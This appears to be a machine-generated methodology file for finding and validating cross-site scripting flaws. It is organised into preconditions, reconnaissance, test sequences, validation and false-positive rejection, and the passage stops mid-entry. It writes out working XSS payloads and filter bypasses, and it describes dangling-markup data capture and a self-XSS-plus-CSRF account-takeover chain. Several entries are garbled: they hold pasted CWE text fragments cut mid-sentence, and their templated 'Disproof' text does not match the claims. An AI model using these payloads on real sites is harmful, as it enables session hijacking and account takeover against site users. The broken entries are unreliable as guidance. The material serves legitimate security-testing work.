# Methodology — Cross-Site Scripting

> Derived from 74 verified items. Regenerate with `python -m wks.methodgen --class xss --apply`. Do not hand-edit: this file is a projection of the evidence, and edits are lost on the next cycle.

**Surface.** Attacker-controlled data reaches a script execution context in another user's browser without neutralisation.

**References.** CWE-79 · A03:2021

## 1. Preconditions

_Nothing below is reachable until these hold. Confirm each against the target before spending time on the technique._

**Reflected XSS requires attacker data from the current HTTP request to be embedded unneutralized in that same immediate response.**

Enumerate every request-controlled surface (query string, message body, URL path, and headers such as Referer) and confirm each candidate produces its value in the immediate response body before treating it as XSS. If the probe value never appears in the immediate response there is no reflected sink, and the candidate must be dropped rather than reported.

- *Disproof:* The unique probe value is absent from the immediate HTTP response for that surface, or appears only after a separate later request, making it stored rather than reflected.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/79.html); [owasp.org](https://owasp.org/www-community/attacks/xss/); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/reflected)

**Stored XSS requires the payload to persist in a server-side store and later render in another user's response, so proof needs two distinct steps.**

Inject a unique marker into every plausible entry point, then hunt for that marker as an exit point in responses seen by a second, different user or role such as an admin view. The injection write and the later rendering read are separate actions; a marker that only ever reflects back to its own author is not stored XSS and must not be filed as such.

- *Disproof:* The payload executes only in the submitting user's own session and never renders for any other user or role.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/79.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/stored)

**Service-worker XSS is only reachable when two prerequisites line up: a place to serve attacker JavaScript from the target origin, either a file upload or a JSONP endpoint whose output can be filled with arbitrary JS, plus an XSS that can load and register that script as the worker.**

Service-worker XSS is only reachable when two prerequisites line up: a place to serve attacker JavaScript from the target origin, either a file upload or a JSONP endpoint whose output can be filled with arbitrary JS, plus an XSS that can load and register that script as the worker.

HackTricks reference: Abusing Service Workers (pentesting-web/xss-cross-site-scripting/abusing-service-workers.md)

- *Disproof:* Registering and controlling a worker script on the origin with neither arbitrary-JS hosting nor a JSONP endpoint that can be made to emit arbitrary JS refutes these as the required prerequisites.
- *Evidence:* high_confidence — [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/dom-based); [raw.githubusercontent.com](https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md)

**An onerror-style inline event handler payload only runs when script-src actually permits inline execution, so the extension CSP has to be read before the payload is called exploitable — 'unsafe-eval' in the policy buys the tester nothing here.**

An onerror-style inline event handler payload only runs when script-src actually permits inline execution, so the extension CSP has to be read before the payload is called exploitable — 'unsafe-eval' in the policy buys the tester nothing here.

HackTricks reference: BrowExt - XSS Example (pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md)

- *Disproof:* An inline event handler payload firing on a page whose script-src carries only 'unsafe-eval', with no 'unsafe-inline', no matching hash or nonce, and no other executable gadget, refutes this gating.
- *Evidence:* high_confidence — [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/contexts); [raw.githubusercontent.com](https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md)

**The worker body is the delivery half of the chain: a fetch-event listener that forwards every intercepted request URL off-origin only runs if that script is served from the vulnerable origin, so both the upload path and the JSONP path are worth probing for a real XSS.**

The worker body is the delivery half of the chain: a fetch-event listener that forwards every intercepted request URL off-origin only runs if that script is served from the vulnerable origin, so both the upload path and the JSONP path are worth probing for a real XSS.

HackTricks reference: Abusing Service Workers (pentesting-web/xss-cross-site-scripting/abusing-service-workers.md)

- *Disproof:* A fetch-listener worker registered and intercepting traffic from a script hosted off the vulnerable origin, or a JSONP response whose callback cannot be broken out of, refutes the origin-delivery requirement.
- *Evidence:* high_confidence — [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/dom-based); [raw.githubusercontent.com](https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md)

**An injection-class report stands only when untrusted input is shown reaching an interpreter that acts on it, and for cross-site scripting that interpreter is the browser executing a script, event handler or DOM write rather than text rendered inert.**

An injection-class report stands only when untrusted input is shown reaching an interpreter that acts on it, and for cross-site scripting that interpreter is the browser executing a script, event handler or DOM write rather than text rendered inert.

HackTricks reference: injections html xss etc (https://oreobiscuit.gitbook.io/introduction/bug-bounty-reports-and-articles/injections-html-xss-etc.md)

- *Disproof:* If the same input is provably neutralised by encoding or escaping before it reaches any browser-executed script context, event handler or DOM write, the cross-site scripting claim fails.
- *Evidence:* high_confidence — [oreobiscuit.gitbook.io](https://oreobiscuit.gitbook.io/introduction/bug-bounty-reports-and-articles/injections-html-xss-etc.md); [owasp.org](https://owasp.org/www-community/attacks/xss/); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/contexts)

## 2. Reconnaissance signals

_What to look for while mapping the surface, and where each signal tells you the rest of the procedure is worth running._

**Reflection alone is not a cross-site scripting finding when the reflected payload sits in the body of a 302: the browser never renders that body, so the injection only counts once it lands somewhere the browser actually parses.**

Reflection alone is not a cross-site scripting finding when the reflected payload sits in the body of a 302: the browser never renders that body, so the injection only counts once it lands somewhere the browser actually parses.

HackTricks reference: XSS (Cross Site Scripting) (pentesting-web/xss-cross-site-scripting/README.md)

- *Disproof:* Script executing from a payload delivered only in the body of a 302 response, in a browser that follows the redirect before parsing, refutes this claim.
- *Evidence:* high_confidence — [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/content-security-policy); [raw.githubusercontent.com](https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/README.md)

**DOM XSS exists only where an attacker-controllable source reaches an execution-capable sink; reading the source alone is not a finding.**

For each source (location.search, location.hash, document.referrer, postMessage, document.cookie) search the page JavaScript for reads of that source, then follow the value through intermediate variables until it reaches a sink such as innerHTML, document.write or eval. Report only after the taint path is proven to terminate in a sink; unreachable variables are dead ends.

- *Disproof:* The source is read but the value always flows into a safe sink such as textContent or setAttribute, or never reaches any execution-capable sink.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/79.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/dom-based)

**The XSS sink to hunt for in extension code is the pattern of reading a value out of an input, concatenating it into an HTML string and appending the result to the DOM, because that route is open even where the extension CSP blocks eval-like and inline script execution.**

The XSS sink to hunt for in extension code is the pattern of reading a value out of an input, concatenating it into an HTML string and appending the result to the DOM, because that route is open even where the extension CSP blocks eval-like and inline script execution.

HackTricks reference: BrowExt - XSS Example (pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md)

- *Disproof:* A concatenating handler whose value is escaped or inserted as text before the append, so the same input renders as literal characters with no new element or handler, refutes this sink pattern.
- *Evidence:* high_confidence — [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/contexts); [raw.githubusercontent.com](https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md)

## 3. Test sequence

_Concrete mutations to try. Each is written to be executable, not to be a description of the vulnerability._

**An injected unclosed attribute makes the browser send the rest of the response to an attacker URL, achieving data capture with no script execution.**

Where script execution is blocked by filters or CSP, dangling markup still exfiltrates. Inject markup that opens an attribute and never closes it — for example an img whose src points at the attacker's server without a closing quote. The browser then scans forward for the next quotation mark to terminate the attribute, and everything up to that point is treated as part of the URL and sent in the request. The captured data is whatever followed the injection point in the response: CSRF tokens, email content, financial data. Grade it by what the response actually contains downstream, not by the fact that a payload appeared.

- *Disproof:* This is wrong if the application escapes or filters the quote and angle-bracket characters that the breakout requires, or if no sensitive data follows the injection point in the response.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/79.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)

**An application that backslash-escapes quotes without escaping the backslash itself is bypassed by prefixing the payload with its own backslash.**

Blocking single quotes with a backslash invites a one-character bypass. If the application turns ' into \', and fails to escape the backslash, an attacker-supplied backslash neutralises the application's own escape: input \';alert(document.domain)// becomes \\';alert(document.domain)//, where the first backslash makes the second literal and the quote terminates the string. Always test this whenever quote escaping is observed — it is one of the highest-yield checks against hand-rolled escaping and costs a single request.

- *Disproof:* This is wrong if the application escapes backslashes first, or uses a vetted encoder or JSON serialiser for the value, in which case the attacker's backslash is itself escaped.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/contexts)

**A JSON response served as text/html and interpolated into a page becomes an HTML injection point even though the body is JSON.**

For each JSON endpoint record the response Content-Type. If the body holding attacker input is served as text/html and is then fetched and written into the DOM (fetch().then(r=>r.text()) into innerHTML, a server-side include of the JSON, or a client template rendering the raw body), the string context is an HTML context. Verify by injecting markup that must break out of the JSON or JS string to reach an executable element.

- *Disproof:* The endpoint returns application/json and no code path inserts the response body into an HTML document, so injected markup is never parsed as markup.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting)

**Stored XSS in collaborative content (wiki, issue tracker, customer ticket, comment, label color, tag) is delivered to every viewer, and when a privileged user views it the payload runs in the privileged session.**

Stored XSS survives when a collaborative field permits style, math, svg, or weak attribute filtering, or when the markdown-to-HTML pipeline (Banzai, Kramdown, RDoc, Kroki, Mermaid, PlantUML) is not sandboxed and re-sanitized. Because these fields are viewed by maintainers, support staff, project owners, or admins, a single stored payload executes in an elevated session: it can XHR to admin-only endpoints, change roles, exfiltrate secrets, and act as organization-level account takeover. Payloads to try: [text](javascript:alert(1)) in markdown, an SVG upload, and diagram directives in the Kroki/PlantUML format containing script.

- *Disproof:* Refuted if the field sanitizes style/svg/math and the diagram renderer is sandboxed, or if privileged users are exempt from the render path.
- *Evidence:* high_confidence — [owasp.org](https://owasp.org/www-community/attacks/xss/); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/stored)

**Self-XSS that harms only the attacker's own session becomes effective stored XSS and account takeover when combined with a CSRF-vulnerable field mutation endpoint.**

A. Confirm self-XSS: a profile field (bio, display_name, signature) executes only for the author's own view. B. Find a CSRF-vulnerable endpoint that mutates that field: no anti-CSRF token, or a text/plain enctype bypass. C. Author an attacker page that submits the form with the XSS payload in the field. D. The victim visits the page; the CSRF fires; the victim's profile now holds the payload. E. On the victim's next visit to their own profile, their browser executes the attacker's JavaScript in the authenticated session - fetch cookies, change the email or password, and take over the account. This reclassifies no-payout self-XSS into a real account-takeover finding. Defense: SameSite cookies and real CSRF tokens on state-changing forms.

- *Disproof:* Refuted if the mutation endpoint enforces a CSRF token, SameSite=Lax/Strict cookies are required, or the field is not stored and rendered.
- *Evidence:* high_confidence — [owasp.org](https://owasp.org/www-community/attacks/xss/); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting)

**An href attribute value is already a script-capable context, so a javascript: pseudo-protocol executes script without terminating the attribute at all.**

Some attribute types can execute script on their own, with no breakout. When reflection lands in the href of an anchor tag, injecting javascript:alert(document.domain) runs as soon as the link is followed, and there is no quote to escape and no tag to close. This is the case to test first whenever a parameter is reflected into a URL-bearing attribute, because it defeats filters that only strip angle brackets and quotes. Note the user's own click is required, which changes the delivery question but not the sink.

- *Disproof:* This is wrong if the application URL-encodes the value so the scheme is no longer at the start of the attribute, strips javascript: case-insensitively, or the attribute is rendered inert with no user interaction possible.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/contexts)

**In the HTML body context the payload must introduce entirely new tags, because the reflection point has no existing quote or delimiter to escape.**

Text between HTML tags offers no delimiter to terminate, so the only route is to introduce new markup that triggers script execution — an img with an onerror handler, or a script block. This is the simplest context and also the one most likely to be filtered, because a naive blocklist usually targets angle brackets and the words script and onerror. Probe it first to learn what the filter does, then move to attribute and script contexts where the same blocklist is usually ineffective.

- *Disproof:* This is wrong if the response is not parsed as HTML at all — for example the endpoint returns application/json and nothing inserts the body into a document — or if every introduced tag is stripped or its event handler neutralised.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/contexts)

**A reflected or stored cross-site scripting entry point is confirmed when a chosen script payload executes in the page context rather than being escaped into inert text.**

In practice on HTB this shows up as: | `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |

Write-up provenance: Esther7171/HackTheBox-Writeups-Walkthroughs :: Write-ups/Academy/05. Web Exploitation/27. Cross-Site Scripting (XSS)/Cross-Site Scripting (XSS).md (713 words, classified web).

- *Disproof:* Refuted when the payload is returned HTML-encoded with no executable sink, which shows the output is contextually escaped rather than vulnerable.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/79.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting); [raw.githubusercontent.com](https://raw.githubusercontent.com/Esther7171/HackTheBox-Writeups-Walkthroughs/main/Write-ups/Academy/05.%20Web%20Exploitation/27.%20Cross-Site%20Scripting%20%28XSS%29/Cross-Site%20Scripting%20%28XSS%29.md)

**XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise.**

with other flaws, for example, "drive-by hacking." 
 
 
 
 
 
 
 
 
 Execute Unauthorized Code or Commands; Bypass Protection Mechanism; Read Application Data 
 
 
 
 
 
 
 Scope: Confidentiality, Integrity, Availability, Access Control 
 
 
 
 The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the

- *Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“XSS can cause a variety of problems for the end user that range in severity from”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/79.html); [owasp.org](https://owasp.org/www-community/attacks/xss/); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting)

**In an HTML attribute-value context, terminating the value and adding an event-handler attribute executes script even when angle brackets are blocked.**

Send a double quote to close the attribute, append an attribute that fires without interaction (autofocus plus onfocus) and a trailing quote to repair the markup, for example " autofocus onfocus=alert(document.domain) x=". Confirm the host CSP does not block inline handlers before treating a failed execution as proof the parameter is safe.

- *Disproof:* The quote is escaped or the value re-quoted so no additional attribute can be injected, or a strict CSP blocks inline event handlers outright.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/contexts)

**Closing an enclosing script tag works because the browser parses HTML before JavaScript, so the injected script is parsed and executed even though the original script is left broken.**

When reflection lands in raw JavaScript, closing the enclosing script tag and opening a new one achieves execution without touching string syntax at all. It works because the browser performs HTML parsing to identify elements including script blocks first, and only then performs JavaScript parsing to execute them — so the original script being left broken with an unterminated string does not prevent the following script from running in the normal way. Understanding this ordering is what explains why a payload that looks syntactically invalid in the source still fires.

- *Disproof:* This is wrong if the application escapes the closing sequence so the script tag cannot be terminated, or if the value sits inside an external JS file rather than inline HTML, where the browser never re-parses it as markup.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/contexts)

**When reflected data is placed inside a script block, terminating the script element is enough to get an event handler out of it, so escaping single quotes in that context buys nothing and the tester should probe the script context rather than the quoted string.**

When reflected data is placed inside a script block, terminating the script element is enough to get an event handler out of it, so escaping single quotes in that context buys nothing and the tester should probe the script context rather than the quoted string.

HackTricks reference: XSS (Cross Site Scripting) (pentesting-web/xss-cross-site-scripting/README.md)

- *Disproof:* A reflected value containing a closing script tag sequence that neither terminates the block nor produces any new element or handler in the rendered page refutes the escapability.
- *Evidence:* high_confidence — [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/content-security-policy); [raw.githubusercontent.com](https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/README.md)

**React and Next.js SSR shift the XSS surface rather than remove it: JSX escapes string values, but server-side rendering of unescaped data plus dangerouslySetInnerHTML / url / style sinks produce XSS that client-side sanitizers cannot reach.**

(1) Next.js SSR renders React components, JSX or TSX to HTML using JavaScript execution; JSX is compiled to JS functions, so {{7*7}} is NOT interpreted as template code by Next.js itself. (2) By default React escapes < > & in JSX text, so classic CSTI payloads do not fire in pure Next.js CSR, but dangerouslySetInnerHTML bypasses that escaping entirely. (3) Client-side sinks (dangerouslySetInnerHTML, href with javascript: scheme, style attribute with user input, element.innerHTML via refs) are NOT protected by React's JSX escaping. (4) PortSwigger's research notes React has no built-in sanitization for dangerouslySetInnerHTML; OWASP's Next.js Security Cheat Sheet directs bug hunters to check for dangerouslySetInnerHTML, __html, innerHTML, insertAdjacentHTML and setInnerHTML, and to test with {{7*7}}, {{this}} and {{constructor.constructor('alert(1)')()}}.

- *Disproof:* Never use dangerouslySetInnerHTML without sanitizing; scheme-allow-list URLs in href; sanitize style/CSS; use React's built-in escaping and CSP with script-src nonces.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Nextjs_Security_Cheat_Sheet.html); [deepstrike.io](https://deepstrike.io/blog/nextjs-security-testing-bug-bounty-guide); [mahsamohajer.com](https://mahsamohajer.com/security)

**Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters.**

ot anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended. 
 Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon (" 
 Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect

- *Disproof:* Refuted when: the same behaviour is absent when the single named control in the claim is present, and the control is shown to be present rather than assumed. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Input validation will not always prevent XSS, especially if you are required to ”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/79.html); [owasp.org](https://owasp.org/www-community/attacks/xss/); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting)

**The DOM sink to hunt for is a message handler that assigns the received event data straight into innerHTML, which makes the injected markup execute in the receiving page's origin.**

The DOM sink to hunt for is a message handler that assigns the received event data straight into innerHTML, which makes the injected markup execute in the receiving page's origin.

HackTricks reference: post message xss (https://kathan19.gitbook.io/howtohunt/xss/post_message_xss.md)

- *Disproof:* If the same handler writes the message through a text-only assignment, or the written content does not execute script or event handlers, the sink is not exploitable.
- *Evidence:* high_confidence — [kathan19.gitbook.io](https://kathan19.gitbook.io/howtohunt/xss/post_message_xss.md); [owasp.org](https://owasp.org/www-community/attacks/xss/); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)

**The same injection in an extension is triaged by where it lands, not by whether it 'works': script in a Manifest V3 service worker is a message/API and code-injection review because there is no DOM to modify, while a sandboxed page is the documented exception to the usual MV3 CSP rule.**

The same injection in an extension is triaged by where it lands, not by whether it 'works': script in a Manifest V3 service worker is a message/API and code-injection review because there is no DOM to modify, while a sandboxed page is the documented exception to the usual MV3 CSP rule.

HackTricks reference: BrowExt - XSS Example (pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md)

- *Disproof:* A payload that reaches a DOM sink and executes as page JavaScript from a Manifest V3 service worker, or a sandboxed page that inherits the host extension's CSP and APIs, refutes this context-based split.
- *Evidence:* high_confidence — [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/contexts); [raw.githubusercontent.com](https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md)

**Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks.**

nd quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon (" 
 Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address. 
 Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a compon

- *Disproof:* Refuted when: the value is bound as a parameter or written through the framework's own encoder, so the interpreter never sees attacker text as syntax. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Even if you make a mistake in your validation (such as forgetting one out of 100”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/79.html); [owasp.org](https://owasp.org/www-community/attacks/xss/); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting)

## 4. Validation

_How to prove the finding rather than infer it. A technique that cannot be validated must not be reported._

**A payload that fires an alert only in the hunter's own browser demonstrates script execution but not a reportable vulnerability, because impact requires the payload to reach another user's session or a reachable victim path.**

Step: separate your PoC into two observations. Observation A (execution): a unique alphanumeric marker or alert fires in your own authenticated session, proving the sink. Observation B (reportability): the same payload is delivered to a page another user will load, or you demonstrate the same-origin action it enables. A write-up resting on observation A alone is a curiosity: it proves nothing about another user's session, and the popup is only a proof mechanism, not the vulnerability. Observation that clears the bar: a marker rendered in a second session's page load, or a completed state-changing request issued from injected script. If you cannot produce B, report it as an unconfirmed execution sink rather than an impact claim.

- *Disproof:* If the payload demonstrably renders and executes in a second, independently authenticated session or in a view reached by another user, then the marker is not self-only and the finding does clear the bar.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting)

**An escape routine that is correct for one context does not protect another, so a finding is wrong until the encoding is shown to match the exact context the value lands in.**

OWASP requires a different encoding per destination: HTML attribute encoding for attributes, \xHH for JavaScript contexts, %HH for URLs, and URL encoding followed by HTML attribute encoding when a URL is placed in an href or src. Output that is encoded for one context and then consumed in another is the mechanism behind most missed XSS, and the encoding looks correct in review while doing nothing at the sink. Confirm the encoding applied matches the context where the value actually lands — for a JSON endpoint that means the Content-Type is application/json rather than text/html.

- *Disproof:* This is wrong if the value is context-correctly encoded by a vetted encoder for its exact destination, or if it is inserted as a property value on a sink that encodes automatically.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/contexts)

**If a DOM source value is URL-encoded before reaching the sink the markup payload cannot survive, making the candidate a false positive.**

When a DOM XSS attempt fails silently, check whether the source string is percent-encoded in transit (encodeURIComponent, or native browser encoding of location.search and location.hash in Chrome, Firefox and Safari). Re-test with characters that are not percent-encoded, or trace the decode step in the code path, before closing the candidate as non-exploitable.

- *Disproof:* A non-encoded payload with no percent sequences in the traced value reaches the sink and executes script in the victim's browser.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/dom-based)

**A page that handles postMessage without validating event.origin accepts attacker-controlled input from any origin.**

postMessage is a controlled way to talk across origins, but the safety is entirely in the receiver's check. The finding is a receiver that acts on event.data without comparing event.origin against an expected allowlist, typically inside an addEventListener('message', ...) handler. Confirm it by hosting a page on your own origin that posts a message to the target window and observing the privileged action. The mirror-image bug is a receiver that trusts data because the sender frame is same-origin — the origin check still belongs in the handler.

- *Disproof:* This is wrong if the handler verifies event.origin against an exact expected origin before acting, or if the data is only used in a context that cannot reach a sink or a privileged action.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html); [developer.mozilla.org](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)

## 5. False-positive rejection

_The checks that eliminate the most common non-findings. Run these BEFORE reporting, not after a rejection._

**Reject a reflected XSS candidate when the reflected value appears in the response only as HTML entities or percent/unicode escapes that the browser decodes back to inert text in that context, because encoding is what makes the reflection non-exploitable.**

Why it looks vulnerable: your unique probe string comes back in the response body at the exact location you expected, so 'the input is reflected' is satisfied and the report writes itself. Reflection is only the first third of the claim; the second third is whether the reflected bytes can terminate the context they sit in.
The mechanism that kills it: output encoding converts < > " ' & into &lt; &gt; &quot; &#39; &amp;, so the browser's HTML tokeniser never sees a tag or an attribute delimiter - the value is delivered as data, not as markup. The kill test is context-specific, which is where most wrong reports die: in an HTML tag-attribute value you need to break the attribute with a quote before you can add an event handler, and if the quote is entity-encoded you cannot; in the HTML body you need angle brackets, and if those are encoded you cannot. CWE-79 makes the corresponding precision requirement explicit: HTML entity encoding is only appropriate for the HTML body, so also verify that the encoding applied matches the context you are testing, rather than assuming 'encoded' means 'safe'.
Exactly what observation kills it: fetch the response with the marker in the parameter and read the RAW bytes around the reflection point - do not read the rendered DOM, because the browser will have decoded the entities and the rendered view looks like your literal payload. If you see &lt;script&gt; or %3Cscript%3E in the raw response, and the rendered node contains a text node (not a <script> element, not an <img> with a live handler), the candidate is a false positive. Also check for double-encoding: if the raw body shows &amp;lt; the value is over-encoded and still inert; a single decode pass yields literal '&lt;'.

- *Disproof:* The rule is wrong if the encoding is applied for the wrong context - for example only HTML-entity-encoded output dropped inside a JavaScript string, a URL, a CSS value or an unquoted attribute, where &quot; and &#39; do not neutralise a quote delimiter and a ';alert(1)// payload still breaks the string. It is also wrong if the entity is decoded and re-serialised anywhere before rendering (a client-side read of .innerHTML followed by a re-write, or a client-side template that re-interprets the text as HTML), because then the inert text becomes live markup.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/79.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/contexts)

**Reject an XSS candidate as unproven when the payload can only be made to render by pasting attacker-supplied JavaScript into the submitter's own address bar or console, because that is self-XSS and not a cross-user finding.**

Why it looks vulnerable: the page genuinely reflects an attacker string into an HTML context and genuinely lacks output encoding, so the code-level defect is real and a scanner will flag it. The trap is that 'the response contains my attacker-controlled markup unsanitised' is not the same as 'another user executes it'.
The mechanism: self-XSS is the case where the attacker cannot reach a victim through a crafted URL or a cross-origin request. The only delivery is social engineering - the victim is talked into pasting the payload into their own browser address bar or console, so the script runs in the submitter's own origin, own session and own screen. Nothing crosses a user boundary: there is no victim, no cross-user exposure, and no server-side trust failure being exploited. PortSwigger classifies this explicitly as a lame, low-impact issue, and MITRE's CWE-79 narrative makes the same point from the other side: the danger of reflected XSS comes from an attacker constructing a URL and luring a victim into clicking it.
Exactly what observation kills it: build the attacker's URL yourself with the payload in the parameter, and try to deliver it to a second party. If you cannot produce a link or auto-submitting form that fires in a DIFFERENT user's browser - because the value must be typed/pasted into the page itself, or because the parameter is a POST body the victim never submits - the candidate is self-XSS. Close your own browser, open a clean one, and confirm the payload never fires without you typing it. Report it as a low-severity hardening note or file it separately; do not write a cross-user XSS report on it.

- *Disproof:* The candidate stops being self-XSS the moment a working delivery exists: a crafted URL (or a CSRF-style auto-submitting form) that fires the payload automatically in any other user's browser, on a page an authenticated victim visits. Then it is ordinary reflected XSS and this rejection rule is wrong. Equally, if the 'pasting' step is not required because the value is stored and later rendered to other users, the finding is stored XSS, not self-XSS.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/79.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/reflected)

**Reject a stored XSS candidate when the submitted payload never appears in any response served to another user or role, because a store-only write with no second-user render is not cross-site script execution.**

Why it looks vulnerable: you POST a payload to a comment field or a profile name, it comes back in the response to YOUR own request with a 200, and the marker persists when you reload - so persistence plus reflection looks like stored XSS and a CVSS vector is already chosen. The missing half is the victim.
